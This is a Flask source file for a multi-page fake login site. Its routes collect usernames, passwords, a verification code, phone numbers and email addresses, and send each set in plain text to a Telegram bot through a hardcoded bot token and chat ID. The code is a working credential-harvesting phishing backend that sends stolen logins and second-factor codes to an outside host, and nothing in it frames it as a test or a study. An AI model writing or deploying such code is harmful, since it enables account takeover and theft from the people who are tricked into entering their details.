from flask import Flask, request, render_template, redirect, url_for
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# Replace these with your bot details
TELEGRAM_BOT_TOKEN = '8457904685:AAHPVCkGflXFDR8TlAdEVAvDotmvZmw9cK0'
TELEGRAM_CHAT_ID = '6201590412'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    return redirect(url_for('login_page_1'))

@app.route('/login_page_1')
def login_page_1():
    return render_template('login_page_1.html')

@app.route('/login_page_1', methods=['POST'])
def login_page_1_post():
    username = request.form['username']
    password = request.form['password']
    send_telegram_message(f"Login attempt: User {username} with password {password}")
    return redirect(url_for('login_page_2'))

@app.route('/login_page_2')
def login_page_2():
    return render_template('login_page_2.html')

@app.route('/login_page_2', methods=['POST'])
def login_page_2_post():
    code = request.form['code']
    send_telegram_message(f"Code {code} received for verification")
    return redirect(url_for('login_page_3'))

@app.route('/login_page_3')
def login_page_3():
    return render_template('login_page_3.html')

@app.route('/login_page_3', methods=['POST'])
def login_page_3_post():
    phone = request.form['phone']
    email = request.form['email']
    password = request.form['password']
    send_telegram_message(f"Verification completed: Phone {phone}, Email {email}, Password {password}")
    return redirect(url_for('complete'))

@app.route('/complete')
def complete():
    return render_template('complete.html')

if __name__ == '__main__':
    app.run(debug=True)